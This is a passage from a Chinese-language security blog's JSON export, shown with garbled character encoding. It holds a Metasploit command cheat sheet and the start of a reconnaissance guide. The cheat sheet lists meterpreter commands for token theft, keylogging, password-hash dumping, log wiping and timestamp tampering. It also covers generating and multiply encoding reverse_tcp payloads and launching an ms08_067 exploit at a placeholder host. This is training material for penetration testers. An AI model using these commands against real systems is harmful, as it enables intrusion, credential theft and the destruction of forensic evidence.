Metasploit/","excerpt":"","text":"msfçš„ä½¿ç”¨Msfconsole:æ˜¯ä¸€ä¸ªä¸€ä½“åŒ–é›†ä¸­æ§åˆ¶å°ï¼Œå…è®¸ä½ è®¿é—®åˆ°å‡ ä¹æ‰€æœ‰çš„MSFæ¡†æ¶é€‰é¡¹** metasploitå°±æ˜¯ä¸€ä¸ªå…è´¹çš„æ¼æ´æ¡†æ¶ï¼Œåˆ©ç”¨ä»–äººäººéƒ½æ˜¯é»‘å®¢ï¼Œä½¿ç”¨è€…ä¸éœ€è¦ä»»ä½•ç¼–ç¨‹åŸºç¡€å°±å¯ä»¥ä½¿ç”¨ checkï¼šæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨msfå¸¸ç”¨å‘½ä»¤: show exploits åˆ—å‡ºmetasploitæ¡†æ¶ä¸­çš„æ‰€æœ‰æ¸—é€æ”»å‡»æ¨¡å—ã€‚ show payloads åˆ—å‡ºmetasploitæ¡†æ¶ä¸­çš„æ‰€æœ‰æ”»å‡»è½½è·ã€‚ show auxiliary åˆ—å‡ºmetasploitæ¡†æ¶ä¸­çš„æ‰€æœ‰è¾…åŠ©æ”»å‡»è½½è·ã€‚ search name æŸ¥æ‰¾metasploitæ¡†æ¶ä¸­æ‰€æœ‰çš„æ¸—é€æ”»å‡»å’Œå…¶ä»–æ¨¡å—ã€‚ info å±•ç¤ºå‡ºåˆ¶å®šæ¸—é€æ”»å‡»æˆ–æ¨¡å—çš„ç›¸å…³ä¿¡æ¯ã€‚ use name è£…è½½ä¸€ä¸ªæ¸—é€æ”»å‡»æˆ–æ¨¡å—ã€‚ LHOST ä½ æœ¬åœ°å¯ä»¥è®©ç›®æ ‡ä¸»æœºè¿æ¥çš„IPåœ°å€ï¼Œé€šå¸¸å½“ç›®æ ‡ä¸»æœºä¸åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…æ—¶ï¼Œå°±éœ€è¦æ˜¯ä¸€ä¸ªå…¬å…±IPåœ°å€ï¼Œç‰¹åˆ«ä¸ºåå¼¹å¼shellä½¿ç”¨ã€‚ RHOST è¿œç¨‹ä¸»æœºæˆ–æ˜¯ç›®æ ‡ä¸»æœºã€‚ set function è®¾ç½®ç‰¹å®šçš„é…ç½®å‚æ•°ï¼ˆEGï¼šè®¾ç½®æœ¬åœ°æˆ–è¿œç¨‹ä¸»æœºå‚æ•°ï¼‰ã€‚ setg function ä»¥å…¨å±€æ–¹å¼è®¾ç½®ç‰¹å®šçš„é…ç½®å‚æ•°ï¼ˆEGï¼šè®¾ç½®æœ¬åœ°æˆ–è¿œç¨‹ä¸»æœºå‚æ•°ï¼‰ã€‚ show options åˆ—å‡ºæŸä¸ªæ¸—é€æ”»å‡»æˆ–æ¨¡å—ä¸­æ‰€æœ‰çš„é…ç½®å‚æ•°ã€‚ show targets åˆ—å‡ºæ¸—é€æ”»å‡»æ‰€æœ‰æ”¯æŒçš„ç›®æ ‡å¹³å°ã€‚ set target num æŒ‡å®šä½ æ‰€çŸ¥é“çš„ç›®æ ‡çš„æ“ä½œç³»ç»Ÿä»¥åŠè¡¥ä¸ç‰ˆæœ¬ç±»å‹ã€‚ set payload name æŒ‡å®šæƒ³è¦ä½¿ç”¨çš„æ”»å‡»è½½è·ã€‚ show advanced åˆ—å‡ºæ‰€æœ‰é«˜çº§é…ç½®é€‰é¡¹ã€‚ set autorunscript migrate -f. åœ¨æ¸—é€æ”»å‡»å®Œæˆåï¼Œå°†è‡ªåŠ¨è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ã€‚ check æ£€æµ‹ç›®æ ‡æ˜¯å¦é€‰å®šæ¸—é€æ”»å‡»å­˜åœ¨ç›¸åº”çš„å®‰å…¨æ¼æ´ã€‚ exploit æ‰§è¡Œæ¸—é€æ”»å‡»æˆ–æ¨¡å—æ¥æ”»å‡»ç›®æ ‡ã€‚ exploit -j åœ¨è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ¸—é€æ”»å‡»ï¼ˆæ”»å‡»å°†åœ¨åå°è¿›è¡Œï¼‰ã€‚ exploit -z æ¸—é€æ”»å‡»å®Œæˆåä¸ä¸å›è¯è¿›è¡Œäº¤äº’ã€‚ exploit -e encoder åˆ¶å®šä½¿ç”¨çš„æ”»å‡»è½½è·ç¼–ç æ–¹å¼ï¼ˆEGï¼šexploit -e shikata_ga_naiï¼‰ã€‚ exploit -h åˆ—å‡ºexploitå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ã€‚ sessions -l åˆ—å‡ºå¯ç”¨çš„äº¤äº’ä¼šè¯ï¼ˆåœ¨å¤„ç†å¤šä¸ªshellæ—¶ä½¿ç”¨ï¼‰ã€‚ sessions -l -v åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„äº¤äº’ä¼šè¯ä»¥åŠè¯¦ç»†ä¿¡æ¯ï¼ŒEGï¼šæ”»å‡»ç³»ç»Ÿæ—¶ä½¿ç”¨äº†å“ªä¸ªå®‰å…¨æ¼æ´ã€‚ sessions -s script åœ¨æ‰€æœ‰æ´»è·ƒçš„metasploitä¼šè¯ä¸­è¿è¡Œä¸€ä¸ªç‰¹å®šçš„metasploitè„šæœ¬ã€‚ sessions -K æ€æ­»æ‰€æœ‰æ´»è·ƒçš„äº¤äº’ä¼šè¯ã€‚ sessions -c cmd åœ¨æ‰€æœ‰æ´»è·ƒçš„metasploitä¼šè¯ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚ sessions -u sessionID å‡çº§ä¸€ä¸ªæ™®é€šçš„win32 shellåˆ°metasploit shellã€‚ db_create name åˆ›å»ºä¸€ä¸ªæ•°æ®åº“é©±åŠ¨æ”»å‡»æ‰€è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼ˆEGï¼šdb_create autopwnï¼‰ã€‚ db_connect name åˆ›å»ºå¹¶è¿æ¥ä¸€ä¸ªæ•°æ®åº“é©±åŠ¨æ”»å‡»æ‰€è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼ˆEGï¼šdb_connect user:passwd@ip/sqlnameï¼‰ã€‚ db_namp åˆ©ç”¨nmapå¹¶æŠŠæ‰«ææ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼ˆæ”¯æŒæ™®é€šçš„nmapè¯­å¥ï¼ŒEGï¼š-sT -v -P0ï¼‰ã€‚ db_autopwn -h å±•ç¤ºå‡ºdb_autopwnå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ã€‚ db_autopwn -p -r -e å¯¹æ‰€æœ‰å‘ç°çš„å¼€æ”¾ç«¯å£æ‰§è¡Œdb_autopwnï¼Œæ”»å‡»æ‰€æœ‰ç³»ç»Ÿï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªåå¼¹å¼shellã€‚ db_destroy åˆ é™¤å½“å‰æ•°æ®åº“ã€‚ db_destroy userï¼špasswd@hostï¼šport/database ä½¿ç”¨é«˜çº§é€‰é¡¹æ¥åˆ é™¤æ•°æ®åº“ã€‚ metasploitå‘½ä»¤ help æ‰“å¼€meterpreterä½¿ç”¨å¸®åŠ©ã€‚ run scriptname è¿è¡Œmeterpreterè„šæœ¬ï¼Œåœ¨scripts/meterpreterç›®å½•ä¸‹å¯æŸ¥çœ‹åˆ°æ‰€æœ‰è„šæœ¬åã€‚ sysinfo åˆ—å‡ºå—æ§ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€‚ ls åˆ—å‡ºç›®æ ‡ä¸»æœºçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä¿¡æ¯ã€‚ use priv åŠ è½½ç‰¹æƒæå‡æ‰©å±•æ¨¡å—ï¼Œæ¥æ‰©å±•metasploitåº“ã€‚ ps æ˜¾ç¤ºæ‰€æœ‰è¿è¡Œçš„è¿›ç¨‹ä»¥åŠç›¸å…³è”çš„ç”¨æˆ·è´¦æˆ·ã€‚ migrate PID è¿ç§»åˆ°ä¸€ä¸ªæŒ‡å®šçš„è¿›ç¨‹IDï¼ˆPIDå·å¯é€šè¿‡pså‘½ä»¤ä»ä¸»æœºä¸Šè·å¾—ï¼‰ã€‚ use incognito åŠ è½½incognitoåŠŸèƒ½ï¼ˆç”¨æ¥ç›—çªƒç›®æ ‡ä¸»æœºçš„ä»¤ç‰Œæˆ–å‡å†’ç”¨æˆ·ï¼‰ list_tokens -u åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œã€‚ list_tokens -g åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·ç»„çš„å¯ç”¨ä»¤ç‰Œã€‚ impersonate_token DOMAIN_NAME\\USERNAME å‡å†’ç›®æ ‡ä¸»æœºä¸Šçš„å¯ç”¨ä»¤ç‰Œã€‚ steal_token PID ç›—çªƒç»™å®šè¿›ç¨‹çš„å¯ç”¨ä»¤ç‰Œå¹¶è¿›è¡Œä»¤ç‰Œå‡å†’ã€‚ drop_token åœæ­¢å‡å†’å½“å‰ä»¤ç‰Œã€‚ getsystem é€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡ç³»ç»Ÿç”¨æˆ·æƒé™ã€‚ execute -f cmd.exe -i æ‰§è¡Œcmd.exeå‘½ä»¤å¹¶è¿›è¡Œäº¤äº’ã€‚ execute -f cmd.exe -i -t ä»¥æ‰€æœ‰å¯ç”¨ä»¤ç‰Œæ¥æ‰§è¡Œcmdå‘½ä»¤å¹¶éšè—è¯¥è¿›ç¨‹ã€‚ rev2self å›åˆ°æ§åˆ¶ç›®æ ‡ä¸»æœºçš„åˆå§‹ç”¨æˆ·è´¦æˆ·ä¸‹ã€‚ reg command åœ¨ç›®æ ‡ä¸»æœºæ³¨å†Œè¡¨ä¸­è¿›è¡Œäº¤äº’ï¼Œåˆ›å»ºï¼Œåˆ é™¤ï¼ŒæŸ¥è¯¢ç­‰æ“ä½œã€‚ setdesktop number åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç”¨æˆ·ç•Œé¢ï¼ˆè¯¥åŠŸèƒ½åŸºäºé‚£äº›ç”¨æˆ·å·²ç™»å½•ï¼‰ã€‚ screenshot å¯¹ç›®æ ‡ä¸»æœºçš„å±å¹•è¿›è¡Œæˆªå›¾ã€‚ upload file å‘ç›®æ ‡ä¸»æœºä¸Šä¼ æ–‡ä»¶ã€‚ download file ä»ç›®æ ‡ä¸»æœºä¸‹è½½æ–‡ä»¶ã€‚ keyscan_start é’ˆå¯¹è¿œç¨‹ç›®æ ‡ä¸»æœºå¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ã€‚ keyscan_dump å­˜å‚¨ç›®æ ‡ä¸»æœºä¸Šæ•è·çš„é”®ç›˜è®°å½•ã€‚ keyscan_stop åœæ­¢é’ˆå¯¹ç›®æ ‡ä¸»æœºçš„é”®ç›˜è®°å½•ã€‚ getprivs å°½å¯èƒ½å¤šçš„è·å–ç›®æ ‡ä¸»æœºä¸Šçš„ç‰¹æƒã€‚ uictl enable keyboard/mouse æ¥ç®¡ç›®æ ‡ä¸»æœºçš„é”®ç›˜å’Œé¼ æ ‡ã€‚ background å°†ä½ å½“å‰çš„metasploit shellè½¬ä¸ºåå°æ‰§è¡Œã€‚ hashdump å¯¼å‡ºç›®æ ‡ä¸»æœºä¸­çš„å£ä»¤å“ˆå¸Œå€¼ã€‚ use sniffer åŠ è½½å—…æ¢æ¨¡å¼ã€‚ sniffer_interfaces åˆ—å‡ºç›®æ ‡ä¸»æœºæ‰€æœ‰å¼€æ”¾çš„ç½‘ç»œç«¯å£ã€‚ sniffer_dump interfaceID pcapname åœ¨ç›®æ ‡ä¸»æœºä¸Šå¯åŠ¨å—…æ¢ã€‚ sniffer_start interfaceID packet-buffer åœ¨ç›®æ ‡ä¸»æœºä¸Šé’ˆå¯¹ç‰¹å®šèŒƒå›´çš„æ•°æ®åŒ…ç¼“å†²åŒºå¯åŠ¨å—…æ¢ã€‚ sniffer_stats interfaceID è·å–æ­£åœ¨å®æ–½å—…æ¢ç½‘ç»œæ¥å£çš„ç»Ÿè®¡æ•°æ®ã€‚ sniffer_stop interfaceID åœæ­¢å—…æ¢ã€‚ add_user username password -h ip åœ¨è¿œç¨‹ç›®æ ‡ä¸»æœºä¸Šæ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€‚ clearev æ¸…æ¥šç›®æ ‡ä¸»æœºä¸Šçš„æ—¥å¿—è®°å½•ã€‚ timestomp ä¿®æ”¹æ–‡ä»¶å±æ€§ï¼Œä¾‹å¦‚ä¿®æ”¹æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ï¼ˆåå–è¯è°ƒæŸ¥ï¼‰ã€‚ reboot é‡å¯ç›®æ ‡ä¸»æœºã€‚ MSFpayloadå‘½ä»¤ msfpayload -h msfpayloadçš„å¸®åŠ©ä¿¡æ¯ã€‚ msfpayload windows/meterpreter/bind_tcp O åˆ—å‡ºæ‰€æœ‰windows/meterpreter/bind_tcpä¸‹å¯ç”¨çš„æ”»å‡»è½½è·çš„é…ç½®é¡¹ï¼ˆä»»ä½•æ”»å‡»è½½è·éƒ½æ˜¯å¯ç”¨é…ç½®çš„ï¼‰ã€‚ msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå›è¿åˆ°LHOSTipçš„LPORTï¼Œå°†å…¶ä¿å­˜ä¸ºåä¸ºpayload.exeçš„windowsä¸‹å¯æ‰§è¡Œç¨‹åºã€‚ msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå›è¿åˆ°LHOSTipçš„LPORTï¼Œå°†å…¶ä¿å­˜ä¸ºåä¸ºpayload.rawï¼Œè¯¥æ–‡ä»¶åé¢çš„msffencodeä¸­ä½¿ç”¨ã€‚ msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå¯¼å‡ºCæ ¼å¼çš„shellcodeã€‚ msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå¯¼å‡ºæˆä»¥%uç¼–ç æ–¹å¼çš„javaScriptè¯­è¨€å­—ç¬¦ä¸²ã€‚ msfencodeå‘½ä»¤ mefencode -h åˆ—å‡ºmsfencodeçš„å¸®åŠ©å‘½ä»¤ã€‚ msfencode -l åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç¼–ç å™¨ã€‚ msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho) æ˜¾ç¤ºç¼–ç ç¼“å†²åŒºçš„æ ¼å¼ã€‚ msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe ä½¿ç”¨shikata_ga_naiç¼–ç å™¨å¯¹payload.rawæ–‡ä»¶è¿›è¡Œ5ç¼–ç ï¼Œç„¶åå¯¼å‡ºä¸€ä¸ªåä¸ºencoded_payload.exeçš„æ–‡ä»¶ã€‚ msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe åˆ›å»ºä¸€ä¸ªç»è¿‡å¤šç§ç¼–ç æ ¼å¼åµŒå¥—ç¼–ç çš„æ”»å‡»è½½è·ã€‚ msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c åˆ›å»ºä¸€ä¸ªçº¯å­—æ¯æ•°å­—çš„shellcodeï¼Œç”±ESIå¯„å­˜å™¨åªæƒ³shellcodeï¼Œä»¥Cè¯­è¨€æ ¼å¼è¾“å‡ºã€‚ MSFcliå‘½ä»¤ msfcli | grep exploit ä»…åˆ—å‡ºæ¸—é€æ”»å‡»æ¨¡å—ã€‚ msfcli | grep exploit/windows ä»…åˆ—å‡ºä¸windowsç›¸å…³çš„æ¸—é€æ”»å‡»æ¨¡å—ã€‚ msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E å¯¹IPå‘èµ·ms08_067_netapiæ¸—é€æ”»å‡»ï¼Œé…ç½®äº†bind_tcpæ”»å‡»è½½è·ï¼Œå¹¶ç»‘å®šåœ¨PORTç«¯å£è¿›è¡Œç›‘å¬ å¦‚ä½•æ›´æ–°MSF1ã€ğŸ±â€ğŸ‰ç›´æ¥åœ¨kaliå®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜ŸæœŸæ›´æ–°ä¸€æ¬¡ã€‚å®˜æ–¹åœ°å€ï¼šhttp://www.kali.org/downloads/kailä¸‹è½½åœ°å€ï¼š [https://pan.baidu.com/s/1c05BnlI http://cdimage.kali.org/kali-weekly/ http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/ æ³¨æ„: æµ‹è¯•ç³»ç»Ÿä¸‹è½½ä¸‹æ¥åæ˜¯zipæ ¼å¼çš„ã€‚è§£å‹åä½¿ç”¨VMæ‰“å¼€ã€‚å¦‚æœæ˜¯VMwareçš„ï¼Œç›´æ¥æ‰“å¼€ç”¨VMwareæ‰“å¼€Metasploitable.vmxæ–‡ä»¶å³å¯ã€‚Metasploitableç³»ç»Ÿçš„é»˜è®¤è´¦å·å’Œå¯†ç æ˜¯msfadmin:msfadminå¦‚æœä½ æƒ³äº†è§£æ›´å¤šå…³äºMetasploitableçš„ä¿¡æ¯ï¼Œä½ å¯ä»¥å»ä¸‹é¢è¿™ä¸ªç½‘ç«™ï¼šhttps://community.rapid7.com/docs/DOC-1875 2ğŸ±â€ğŸš€ã€åŠ å…¥æ›´æ–°æºä¸€ã€æ›¿æ¢yumæºï¼ŒæŠŠkailåŸæœ‰æ›´æ–°æº#å·æ³¨é‡Šæ‰ root@kali:~#vi /etc/apt/sources.listï¼ˆè¿™æ˜¯ä¿®æ”¹æ›´æ–°æºï¼‰ ï¼ˆæ›´æ–°æºå…¨å›½å„åœ°éƒ½ä¸ä¸€æ ·ï¼Œå› ä¸ºå½“åœ°çš„ç”µä¿¡ï¼Œç§»åŠ¨é˜²ç«å¢™ä¼šæ‹¦æˆªï¼‰ kali-rollingç‰ˆæœ¬ï¼šï¼ˆä¸­ç§‘å¤§çš„å°±å¤Ÿç”¨äº†ï¼Œä¸ªäººæŒ‰éœ€å§ï¼‰ # kaliå®˜æ–¹æº deb http://http.kali.org/ kali-rolling main non-free contrib deb-src http://http.kali.org/ kali-rolling main non-free contrib #ä¸­ç§‘å¤§æº deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib shift+ï¼šwqä¿å­˜é€€å‡º æ·»åŠ æ•°å­—ç­¾åwget archive.kali.org/archive-key.asc //ä¸‹è½½ç­¾å apt-key add archive-key.asc //å®‰è£…ç­¾å æ³¨ï¼šå¦‚æœæ·»åŠ æ•°å­—ç­¾åè¿˜æç¤ºæ— æ³•å®‰è£…å¯åˆ é™¤åŸæœ‰msf root@kali:~# apt remove metasploit-framework æ³¨ï¼šå¸è½½è¿‡ç¨‹ä¸­æ— æ³•è·å¾—é”/var/cache/apt/archives/lock - open (11:èµ„æºæš‚æ—¶ä¸å¯ç”¨) æ— æ³•å¯¹ç›®å½•/var/cache/apt/archives/åŠ é” root@kali:~# sudo rm /var/cache/apt/archives/lock //è¿›è¡Œå¼ºåˆ¶è§£é” root@kali:~# sudo rm /var/cache/apt/archives/ å®‰è£…msfæ¡†æ¶oot@bogon:~# apt-get update root@kali:~# apt-get install metasploit-framework//å®‰è£…msfæ¡†æ¶ é€‰æ‹©yesè¯´æ˜æ›´æ–°æˆåŠŸ root@kali:~#msfconsole //å‘ç°æœ‰æç¤ºæ•°æ®åº“æœªå¯åŠ¨ï¼Œé€€å‡ºmsfå¯åŠ¨æ•°æ®åº“ root@kali:~# systemctl start postgresql //å¯åŠ¨æ•°æ®åº“ root@kali:~# systemctl enable postgresql //å…è®¸å¼€æœºè‡ªå¯åŠ¨ root@kali:~# msfdb init //æ„å»ºæ•°æ®åº“ç¼“å­˜ root@kali:~#msfconsole æ³¨æ„ï¼šå¦‚æœæ›´æ–°å®Œmsfå‡ºç°æ‰ä¸‹é—®é¢˜ root@kaliew:~# msfconsole [*] Bundler failed to load and returned this error: â€˜cannot load such file â€“ bundler/setupâ€™ [*] You may need to uninstall or upgrade bundler è§£å†³æ–¹æ³•ï¼š root@kaliew:~# sudo gem install bundler root@kaliew:~# bundle update celluloid MSFä¹‹meterpreteråæœŸæ”»å‡»ä½¿ç”¨æ–¹æ³•https://www.jianshu.com/nb/46943313","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","date":"2019-09-30T11:48:18.000Z","updated":"2020-09-20T08:59:15.311Z","comments":true,"path":"2019/09/30/ä¿¡æ¯æ”¶é›†/","link":"","permalink":"https://zhangyanlady.github.io/2019/09/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"ä¿¡æ¯æ”¶é›†1.1 ç¬¬ä¸€æ­¥ åŸŸåæ¢æµ‹â€‹ å½“æˆ‘ä»¬è¦å¯¹ä¸€ä¸ªç«™ç‚¹è¿›è¡Œæ¸—é€æµ‹è¯•ä¹‹å‰ï¼Œä¸€èˆ¬æ¸—é€æµ‹è¯•äººå‘˜å¸¸è§æ–¹æ³•æ˜¯ç›´æ¥é€šæ¼æ´æ‰«æå™¨æ¥å¯¹æŒ‡å®šç›®æ ‡ç«™ç‚¹è¿›è¡Œæ¸—é€ï¼Œå½“æŒ‡å®šçš„ç›®æ ‡ç«™ç‚¹æ— æ¼æ´æƒ…å†µï¼Œæ¸—é€æµ‹è¯•å‘˜å°±éœ€è¦è¿›è¡Œä¿¡æ¯æ”¶é›†å·¥ä½œæ¥å®ŒæˆåæœŸçš„æ¸—é€ã€‚ â€‹ ç›®å‰ä¸€èˆ¬åŸŸåæ¼æ´æ‰«æå·¥å…·æœ‰AWVSã€APPSCANã€Netsparkã€WebInspectã€Nmapã€Nessusã€å¤©é•œã€æ˜é‰´ã€WVSSã€RSASç­‰ï¼Œåé¢ä¼šåˆ†å¼€ç»™å¤§å®¶è®²è§£ã€‚ 1.2 ç¬¬äºŒæ­¥ å­åŸŸåæ¢æµ‹æ ¹æ®ä¸»åŸŸåï¼Œå¯ä»¥è·å–äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåã€â€¦â€¦ä¸»è¦å§¿åŠ¿å¯ä»¥æœ‰ï¼š ã€1ã€‘DNSåŸŸä¼ é€æ¼æ´ï¼ˆä¸å¾—ä¸ç§°èµï¼‰ â€‹ å¦‚æœå­˜åœ¨ï¼Œä¸ä»…èƒ½æœé›†å­åŸŸåï¼Œè¿˜èƒ½è½»æ¾æ‰¾åˆ°ä¸€æšæ´ï¼Œè¿™æ ·å­çš„å¥½äº‹ç™¾è¯•ä¸åŒã€‚å¦‚æœSRCä¸€çº§åŸŸåä¸å¤šï¼Œç›´æ¥åœ¨kaliä¸‹ dnsenum oldboyedu.com ã€‚ å·¥å…·è¯´æ˜åŠç”¨æ³•å¯å‚è€ƒå¦‚ä¸‹ï¼š â€‹ dnsenumçš„ç›®çš„æ˜¯å°½å¯èƒ½æ”¶é›†ä¸€ä¸ªåŸŸçš„ä¿¡æ¯ï¼Œå®ƒèƒ½å¤Ÿé€šè¿‡è°·æ­Œæˆ–è€…å­—å…¸æ–‡ä»¶çŒœæµ‹å¯èƒ½å­˜åœ¨çš„åŸŸåï¼Œä»¥åŠå¯¹ä¸€ä¸ªç½‘æ®µè¿›è¡Œåå‘æŸ¥è¯¢ã€‚å®ƒå¯ä»¥æŸ¥è¯¢ç½‘ç«™çš„ä¸»æœºåœ°å€ä¿¡æ¯ã€åŸŸåæœåŠ¡å™¨ã€mx recordï¼ˆå‡½ä»¶äº¤æ¢è®°å½•ï¼‰ï¼Œåœ¨åŸŸåæœåŠ¡å™¨ä¸Šæ‰§è¡Œaxfrè¯·æ±‚ï¼Œé€šè¿‡è°·æ­Œè„šæœ¬å¾—åˆ°æ‰©å±•åŸŸåä¿¡æ¯ï¼ˆgoogle hackingï¼‰ï¼Œæå–è‡ªåŸŸåå¹¶æŸ¥è¯¢ï¼Œè®¡ç®—Cç±»åœ°å€å¹¶æ‰§è¡ŒwhoisæŸ¥è¯¢ï¼Œæ‰§è¡Œåå‘æŸ¥è¯¢ï¼ŒæŠŠåœ°å€æ®µå†™å…¥æ–‡ä»¶ã€‚ å‚æ•°è¯´æ˜ï¼š -h æŸ¥çœ‹å·¥å…·ä½¿ç”¨å¸®åŠ© â€“dnsserver æŒ‡å®šåŸŸåæœåŠ¡å™¨ â€“enum å¿«æ·é€‰é¡¹ï¼Œç›¸å½“äºâ€â€“threads 5 -s 15 -wâ€ â€“noreverse è·³è¿‡åå‘æŸ¥è¯¢æ“ä½œ â€“nocolor æ— å½©è‰²è¾“å‡º â€“private æ˜¾ç¤ºå¹¶åœ¨â€domain_ips.txtâ€æ–‡ä»¶ç»“å°¾ä¿å­˜ç§æœ‰çš„ips â€“subfile å†™å…¥æ‰€æœ‰æœ‰æ•ˆçš„å­åŸŸååˆ°æŒ‡å®šæ–‡ä»¶ -t, â€“timeout tcpæˆ–è€…udpçš„è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸º10sï¼ˆæ—¶é—´å•ä½ï¼šç§’ï¼‰ â€“threads æŸ¥è¯¢çº¿ç¨‹æ•° -v, â€“verbose æ˜¾ç¤ºæ‰€æœ‰çš„è¿›åº¦å’Œé”™è¯¯æ¶ˆæ¯ -o ,â€“output è¾“å‡ºé€‰é¡¹ï¼Œå°†è¾“å‡ºä¿¡æ¯ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ -e, â€“exclude åå‘æŸ¥è¯¢é€‰é¡¹ï¼Œä»åå‘æŸ¥è¯¢ç»“æœä¸­æ’é™¤ä¸æ­£åˆ™è¡¨è¾¾å¼ç›¸ç¬¦çš„PTRè®°å½•ï¼Œåœ¨æ’æŸ¥æ— æ•ˆä¸»æœºä¸Šéå¸¸æœ‰ç”¨ -w, â€“whois åœ¨ä¸€ä¸ªCæ®µç½‘ç»œåœ°å€èŒƒå›´æä¾›whoisæŸ¥è¯¢ -f dns.txt æŒ‡å®šå­—å…¸æ–‡ä»¶ï¼Œå¯ä»¥æ¢æˆ dns-big.txt ä¹Ÿå¯ä»¥è‡ªå®šä¹‰å­—å…¸ ç›¸å…³è§£æè®°å½•è¯´æ˜å¯å‚è€ƒï¼šhttps://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html ã€2ã€‘å¤‡æ¡ˆå·æŸ¥è¯¢ â€‹ è¿™ç®—æ˜¯å¥‡æ‹›å§ï¼Œé€šè¿‡æŸ¥è¯¢ç³»ç»ŸåŸŸåå¤‡æ¡ˆå·ï¼Œå†åæŸ¥å¤‡æ¡ˆå·ç›¸å…³çš„åŸŸåï¼Œæ”¶è·é¢‡ä¸°ã€‚ ç½‘ç«™å¤‡æ¡ˆæŸ¥è¯¢åœ°å€ï¼šhttp://www.beianbeian.com ã€3ã€‘SSLè¯ä¹¦ â€‹ é€šè¿‡æŸ¥è¯¢SSLè¯ä¹¦ï¼Œè·å–çš„åŸŸåå­˜æ´»ç‡å¾ˆé«˜ï¼Œè¿™åº”è¯¥ä¹Ÿæ˜¯ä¸é”™çš„æ€è·¯ã€‚ æŸ¥è¯¢ç½‘å€: https://myssl.com/ssl.html å’Œhttps://www.chinassl.net/ssltools/ssl-checker.html ã€4ã€‘googleæœç´¢Cæ®µ â€‹ è¿™æ‹›ç”¨çš„æ¯”è¾ƒå°‘ï¼Œå›½å†…æ²¡æ¡ä»¶çš„å°±ç”¨bingæˆ–ç™¾åº¦å§ï¼ˆå›½å†…ç«™ç‚¹è¶³çŸ£ï¼‰ï¼Œåœ¨æ²¡ä»€ä¹ˆè¿›å±•çš„æ—¶å€™æˆ–è®¸ä¼šæœ‰æ„å¤–æƒŠå–œã€‚ æ–¹æ³•ä¸€ï¼šå‚è€ƒGoogleHackç”¨æ³• æ–¹æ³•äºŒï¼šç”¨k8å·¥å…·ï¼Œå‰ææ¡ä»¶è®°å¾—æ³¨å†Œbingæ¥å£ ä»€ä¹ˆæ˜¯Cæ®µï¼šæ¯”å¦‚åœ¨ï¼š127.127.127.4 è¿™ä¸ªIPä¸Šé¢æœ‰ä¸€ä¸ªç½‘ç«™ 127.4 